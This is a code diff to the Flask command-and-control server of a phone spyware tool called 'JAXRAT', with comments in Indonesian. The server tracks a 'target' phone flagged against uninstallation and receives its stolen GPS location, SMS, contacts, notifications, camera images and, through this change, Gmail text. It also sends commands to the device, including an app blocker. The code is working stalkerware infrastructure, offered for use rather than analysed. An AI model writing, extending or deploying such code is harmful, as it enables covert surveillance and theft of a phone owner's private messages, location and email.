@@ -9,7 +9,17 @@ PASSWORD = "jaxrat123"
 
 devices = {"hp_target_1": {"name": "HP Target", "status": "online", "last_seen": "-", "anti_uninstall": True}}
 latest_commands = {"hp_target_1": "none"}
-latest_results = {"hp_target_1": {"gps": "Belum ada data", "sms": [], "contacts": [], "notifs": []}}
+
+# Menampung semua tipe data spy
+latest_results = {
+    "hp_target_1": {
+        "gps": "Belum ada data", 
+        "sms": [], 
+        "contacts": [], 
+        "notifs": [], 
+        "gmail": ""
+    }
+}
 
 UPLOAD_FOLDER = os.path.join(app.root_path, 'static', 'uploads')
 os.makedirs(UPLOAD_FOLDER, exist_ok=True)
@@ -58,25 +68,29 @@ def get_command(device_id):
 def upload_result(device_id):
     data = request.json
     if device_id in latest_results:
-        if data.get("type") == "gps":
+        tipe = data.get("type")
+        if tipe == "gps":
             latest_results[device_id]["gps"] = data.get("data")
-        elif data.get("type") == "sms":
+        elif tipe == "sms":
             latest_results[device_id]["sms"] = data.get("data")
-        elif data.get("type") == "contacts":
+        elif tipe == "contacts":
             latest_results[device_id]["contacts"] = data.get("data")
+        elif tipe == "gmail":
+            latest_results[device_id]["gmail"] = data.get("data")
+            print(f"[SPY] Teks Gmail masuk!")
+        print(f"[SPY] Data {tipe} masuk dari {device_id}")
     return jsonify({"status": "success"})
 
-# --- ENDPOINT NOTIFIKASI BARU ---
+# Endpoint notifikasi (dipanggil terus-terusan, jadi dibuat terpisah biar rapi)
 @app.route('/api/upload_notification/<device_id>', methods=['POST'])
 def upload_notification(device_id):
     data = request.json
     if device_id in latest_results:
-        # Simpan maksimal 30 notifikasi terakhir biar gak berat
         notif_list = latest_results[device_id]["notifs"]
-        notif_list.insert(0, data) # Taruh paling atas (terbaru)
+        notif_list.insert(0, data)
         if len(notif_list) > 30:
-            notif_list.pop() # Buang yang paling lama
-        print(f"[SPY] Notif masuk dari {data.get('app')}: {data.get('title')}")
+            notif_list.pop()
+        print(f"[SPY] Notif masuk dari {data.get('app')}")
     return jsonify({"status": "success"})
 
 @app.route('/api/get_results/<device_id>', methods=['GET'])
@@ -92,6 +106,16 @@ def clear_result(device_id, result_type):
         elif result_type == "sms": latest_results[device_id]["sms"] = []
         elif result_type == "contacts": latest_results[device_id]["contacts"] = []
         elif result_type == "notifs": latest_results[device_id]["notifs"] = []
+        elif result_type == "gmail": latest_results[device_id]["gmail"] = ""
+    return jsonify({"status": "success"})
+
+@app.route('/api/set_blocked_apps/<device_id>', methods=['POST'])
+def set_blocked_apps(device_id):
+    if not session.get('logged_in'): return jsonify({"status": "error"}), 401
+    data = request.json
+    apps = data.get("apps", "")
+    latest_commands[device_id] = f"block_apps|{apps}"
+    print(f"[JAXRAT] Update App Blocker: {apps if apps else 'Dilepas semua'}")
     return jsonify({"status": "success"})
 
 @app.route('/api/upload_image/<device_id>', methods=['POST'])
@@ -101,16 +125,7 @@ def upload_image(device_id):
     if file.filename == '': return jsonify({"status": "error"}), 400
     filepath = os.path.join(UPLOAD_FOLDER, 'latest.jpg')
     file.save(filepath)
-    return jsonify({"status": "success"})
-    
-@app.route('/api/set_blocked_apps/<device_id>', methods=['POST'])
-def set_blocked_apps(device_id):
-    if not session.get('logged_in'): return jsonify({"status": "error"}), 401
-    data = request.json
-    apps = data.get("apps", "")
-    # Kirim perintah ke HP untuk update blocklist
-    latest_commands[device_id] = f"block_apps|{apps}"
-    print(f"[JAXRAT] Update App Blocker: {apps}")
+    print(f"[SPY] Gambar kamera diterima!")
     return jsonify({"status": "success"})
 
 if __name__ == '__main__':
